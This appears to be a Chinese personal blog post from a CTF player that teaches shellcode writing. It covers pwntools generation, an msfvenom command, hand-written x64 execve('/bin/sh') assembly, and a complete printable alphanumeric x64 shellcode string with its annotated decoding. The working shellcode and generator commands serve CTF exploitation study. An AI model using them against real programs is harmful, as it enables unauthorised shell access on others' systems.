---
layout : post
author : wsxk
date : 2022-6-6
comments : true
title: "shellcode编写"
tags: [pwn]
---

国赛的时候一道一个要你写shellcode的题目，但是这个shellcode不是一般的shellcode，必须是可打印字符串的shellcode，有被恶心到。

于是想总结一下各自shellcode的编写技巧

- [自动生成shellcode（x32/x64）](#自动生成shellcodex32x64)
  - [metasploit alphanumeric/printable shellcode（x32）](#metasploit-alphanumericprintable-shellcodex32)
- [手写shellcode（x64）](#手写shellcodex64)
  - [alphanumeric/printable shellcode（x64）](#alphanumericprintable-shellcodex64)
- [reference](#reference)

# 自动生成shellcode（x32/x64）

自动生成shellcode可以利用pwntools里的shellcode生成工具。

``` python
from pwn import *
context.arch = 'amd64'  # 设定架构
shellcode = asm(shellcraft.sh()) #生成shellcode
```

但是这种生成的shellcode比较长，也无法满足一些特定shellcode的需求。所以我们需要手动编写

## metasploit alphanumeric/printable shellcode（x32）

[https://www.anquanke.com/post/id/85871](https://www.anquanke.com/post/id/85871)

可以用metasploit自动生成可打印的shellcode

    msfvenom -a x86 --platform linux -p linux/x86/exec CMD="sh" -e x86/alpha_mixed BufferRegister=ECX -f python

其中bufferregister这个选项是重要的，取决你的shellcode由那个寄存器调用。

# 手写shellcode（x64）

shellcode的原理都是通过系统调用进行 exec("/bin/sh")

系统调用可以参考下面的链接

[http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/](http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)

``` python
from pwn import *
context.arch = 'amd64'
shellcode = '''
xor rdx,rdx;
push rdx;
mov rsi,rsp;
mov rax,0x68732f2f6e69622f;
push rax;
mov rdi,rsp;
mov rax,59;
syscall;
'''
shellcode = asm(shellcode)
```

## alphanumeric/printable shellcode（x64）

以下是一些可打印字符串对应的汇编指令代码

利用可打印字符串的核心思想是异或，通过异或得到我们想要的内容。

``` asm
0x50: push   rax
0x51: push   rcx
0x52: push   rdx
0x53: push   rbx
0x54: push   rsp
0x55: push   rbp
0x56: push   rsi
0x57: push   rdi
0x4150: push r8
0x4151: push r9
0x4152: push r10
0x4153: push r11
0x4154: push r12
0x4155: push r13
0x4156: push r14
0x4157: push r15

0x58: pop    rax
0x59: pop    rcx
0x5a: pop    rdx
0x4158: pop r8
0x4159: pop r9
0x415a: pop r10

0x34XX: xor al, imm8
0x35XXYY: xor ax, imm16
0x35XXYYZZWW: xor eax, imm32
0x6aXX: push imm8
0x68XXYYZZWW: push imm32
xor DWORD PTR [r64 + imm8], r32
```

这里列一个比较常用的shellcode

PPYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXA

含义

    /* from call rax */
    push rax /*可以根据调用的寄存器来更好前面2个字母*/
    push rax
    pop rcx

    /* XOR pop rsi, pop rdi, syscall */
    push 0x41413030
    pop rax
    xor DWORD PTR [rcx+0x30], eax

    /* XOR /bin/sh */
    push 0x34303041
    pop rax
    xor DWORD PTR [rcx+0x34], eax
    push 0x41303041
    pop rax
    xor DWORD PTR [rcx+0x38], eax

    /* rdi = &'/bin/sh' */
    push rcx
    pop rax
    xor al, 0x34
    push rax

    /* rdx = 0 */
    push 0x30
    pop rax
    xor al, 0x30
    push rax
    pop rdx

    push rax

    /* rax = 59 (SYS_execve) */
    push 0x41
    pop rax
    xor al, 0x7a

    /* pop rsi, pop rdi*/
    /* syscall */ 
    .byte 0x6e
    .byte 0x6f
    .byte 0x4e
    .byte 0x44

    /* /bin/sh */
    .byte 0x6e
    .byte 0x52
    .byte 0x59
    .byte 0x5a
    .byte 0x6e
    .byte 0x43
    .byte 0x5a
    .byte 0x41



# reference

[https://hama.hatenadiary.jp/entry/2017/04/04/190129](https://hama.hatenadiary.jp/entry/2017/04/04/190129)

[https://nuoye-blog.github.io/2020/05/09/dea90f48/](https://nuoye-blog.github.io/2020/05/09/dea90f48/)